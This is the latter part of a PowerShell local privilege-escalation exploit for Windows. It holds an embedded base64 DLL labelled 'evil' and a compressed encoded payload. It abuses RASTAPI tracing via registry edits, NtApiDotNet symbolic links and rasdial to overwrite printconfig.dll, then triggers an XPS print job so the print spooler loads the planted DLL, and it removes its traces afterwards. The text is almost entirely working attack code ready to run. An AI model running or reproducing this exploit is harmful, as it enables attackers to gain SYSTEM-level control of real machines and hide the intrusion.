AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAGAAAAPCg+KBIoVCheKKQopiiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
[System.Convert]::FromBase64String($dllb64) | Set-Content -force $evilDllPath -Encoding Byte
$EncodedCompressedFile = @'
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
'@
sal a New-Object;(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()|Set-Content $tpath -Force



#create sysmbolink
[NtApiDotNet.NtFile]::CreateMountPoint("\??\$tmpDir", "\RPC Control", $null)
$new = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\RASTAPI.LOG", "\??\$tpath")
$old = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\RASTAPI.OLD", "\??\$outDllPath")

$regpath = "HKLM:\SOFTWARE\Microsoft\Tracing\RASTAPI"
Set-ItemProperty -Path $regpath -Name "FileDirectory" -Value $tmpDir
Set-ItemProperty -Path $regpath -Name "EnableFileTracing" -Value 1
Set-ItemProperty -Path $regpath -Name "MaxFileSize" -Value 0x1000
sleep(3)

#process cmd
#rasdial VPNTEST test test /PHONEBOOK:phonebookPath
Start-Process -NoNewWindow rasdial.exe "VPNTEST test test /PHONEBOOK:$phonebook"

sleep(3)
#clean
Set-ItemProperty -Path $regpath -Name "FileDirectory" -Value "%windir%\tracing"
Set-ItemProperty -Path $regpath -Name "EnableFileTracing" -Value 0
Set-ItemProperty -Path $regpath -Name "MaxFileSize" -Value 0x100000 

$old.Dispose()
$new.Dispose()

[NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$tmpDir") | Out-Null
Remove-Item -Path $tmpDir -Force
Remove-Item -Path $tpath -Force
Remove-Item -Path $phonebook -Force
sleep(3)

#move evilDllPath to printconfig.dll
Write-Host "move $evilDllPath to $outDllPath"
copy $evilDllPath $outDllPath


#run exp 
$mycode = @"
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
namespace XPS
{
public class XpsPrint
{
public static void StartPrintJob()
{
PrintJob("Microsoft XPS Document Writer", "myjob");
}
public static void PrintJob(string printerName, string jobName)
{
IntPtr completionEvent = CreateEvent(IntPtr.Zero, true, false, null);
if (completionEvent == IntPtr.Zero)
throw new Win32Exception();
try
{
IXpsPrintJob job;
IXpsPrintJobStream jobStream;
StartJob(printerName, jobName, completionEvent, out job, out jobStream);
jobStream.Close();


}
finally
{
if (completionEvent != IntPtr.Zero)
CloseHandle(completionEvent);
}
}
 private static void StartJob(string printerName, string jobName, IntPtr completionEvent, out IXpsPrintJob job, out IXpsPrintJobStream jobStream)
{
int result = StartXpsPrintJob(printerName, jobName,null, IntPtr.Zero, completionEvent,
null, 0, out job, out jobStream, IntPtr.Zero);

}
[DllImport("XpsPrint.dll", EntryPoint = "StartXpsPrintJob")]
private static extern int StartXpsPrintJob(
[MarshalAs(UnmanagedType.LPWStr)] String printerName,
[MarshalAs(UnmanagedType.LPWStr)] String jobName,
[MarshalAs(UnmanagedType.LPWStr)] String outputFileName,
IntPtr progressEvent, 
IntPtr completionEvent, 
[MarshalAs(UnmanagedType.LPArray)] byte[] printablePagesOn,
UInt32 printablePagesOnCount,
out IXpsPrintJob xpsPrintJob,
out IXpsPrintJobStream documentStream,
IntPtr printTicketStream); 
[DllImport("Kernel32.dll", SetLastError = true)]
private static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);
[DllImport("Kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern WAIT_RESULT WaitForSingleObject(IntPtr handle, Int32 milliseconds);
[DllImport("Kernel32.dll", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool CloseHandle(IntPtr hObject);
}
[Guid("0C733A30-2A1C-11CE-ADE5-00AA0044773D")] 
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IXpsPrintJobStream
{
void Read([MarshalAs(UnmanagedType.LPArray)] byte[] pv, uint cb, out uint pcbRead);
void Write([MarshalAs(UnmanagedType.LPArray)] byte[] pv, uint cb, out uint pcbWritten);
void Close();
}
[Guid("5ab89b06-8194-425f-ab3b-d7a96e350161")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IXpsPrintJob
{
void Cancel();
void GetJobStatus(out XPS_JOB_STATUS jobStatus);
}
[StructLayout(LayoutKind.Sequential)]
struct XPS_JOB_STATUS
{
public UInt32 jobId;
public Int32 currentDocument;
public Int32 currentPage;
public Int32 currentPageTotal;
public XPS_JOB_COMPLETION completion;
public Int32 jobStatus; 
};
enum XPS_JOB_COMPLETION
{
XPS_JOB_IN_PROGRESS = 0,
XPS_JOB_COMPLETED = 1,
XPS_JOB_CANCELLED = 2,
XPS_JOB_FAILED = 3
}
enum WAIT_RESULT
{
WAIT_OBJECT_0 = 0,
WAIT_ABANDONED = 0x80,
WAIT_TIMEOUT = 0x102,
WAIT_FAILED = -1 
}
}

"@
add-type -typeDefinition $mycode
[XPS.XpsPrint]::StartPrintJob()
exit